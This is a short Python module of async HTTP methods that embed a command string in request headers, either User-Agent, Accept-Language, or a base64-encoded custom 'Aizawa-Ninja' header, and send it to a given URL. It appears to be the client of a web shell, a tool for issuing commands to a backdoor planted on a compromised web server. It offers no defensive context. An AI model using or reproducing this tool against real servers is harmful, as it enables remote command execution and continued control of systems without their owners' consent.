import base64
from .request import HttpRequest
from modules.header import Headers

class HttpMethods:
    """
        A static method that sends an HTTP GET request to the specified URL with the headers containing modified field.
        
        :param client: The client to use for the request.
        :type client: Client

        :param url: The URL to send the request to.
        :type url: str

        :param cmd: The command to include in the headers.
        :type cmd: str

        :return: A coroutine that resolves to the response of the request.
        :rtype: Coroutine
    """
    @staticmethod
    async def http_accept_language_get(client, url, cmd):
        headers = Headers.create(None, cmd)
        return await HttpRequest.request(client, "get", url, headers)

    @staticmethod
    async def http_accept_language_post(client, url, data, cmd):
        headers = Headers.create(None, cmd)
        return await HttpRequest.request(client, "post", url, headers, data)

    @staticmethod
    async def http_aizawa_ninja(client, url, cmd):
        headers = Headers.create()
        headers["Aizawa-Ninja"] = base64.b64encode(cmd.encode("utf-8"))
        return await HttpRequest.request(client, "get", url, headers)

    @staticmethod
    async def http_user_agent_get(client, url, cmd):
        headers = Headers.create(cmd, None)
        return await HttpRequest.request(client, "get", url, headers)

    @staticmethod
    async def http_user_agent_post(client, url, data, cmd):
        headers = Headers.create(cmd, None)
        return await HttpRequest.request(client, "post", url, headers, data)